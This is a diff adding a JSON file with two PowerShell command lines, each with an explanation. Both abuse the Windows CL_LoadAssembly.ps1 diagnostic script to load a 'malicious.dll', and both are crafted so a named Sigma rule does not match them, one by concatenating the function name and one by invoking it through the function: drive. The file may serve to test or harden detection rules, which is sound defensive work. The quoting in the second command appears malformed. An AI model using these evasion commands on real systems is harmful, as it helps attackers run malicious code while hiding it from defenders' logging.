@@ -1,0 +1,10 @@
+[
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Diagnostics\\system\\Networking\\CL_LoadAssembly.ps1; $func = 'LoadAssembly'+'FromPath'; & $func 'C:\\path\\to\\malicious.dll' 'Target.Namespace' 'Target.Class'",
+    "explanation": "The Sigma rule looks for the literal strings 'LoadAssemblyFromPath ' or 'LoadAssemblyFromNS ' in the command line. This bypass uses string concatenation to split the function name into two parts ('LoadAssembly' + 'FromPath'), storing it in a variable. By using the call operator (&) to execute the variable, the literal string never appears in the process creation logs, evading the detection pattern."
+  },
+  {
+    "output": "powershell.exe -Command \"Import-Module C:\\Windows\\Diagnostics\\system\\Networking\\CL_LoadAssembly.ps1; Get-Item -Path function:LoadAssemblyFromPath | Select-Object -ExpandProperty ScriptBlock | . -args 'C:\\path\\to\\malicious.dll'\", \"Namespace\", \"Class\"",
+    "explanation": "This bypass avoids calling the function by name directly on the command line. Instead, it references the function through the PowerShell 'function:' drive and executes its ScriptBlock directly. Since the command line contains 'function:LoadAssemblyFromPath' (without the trailing space required by the rule) or interacts via the pipeline, it fails to match the specific 'contains' selection in the Sigma rule."
+  }
+]
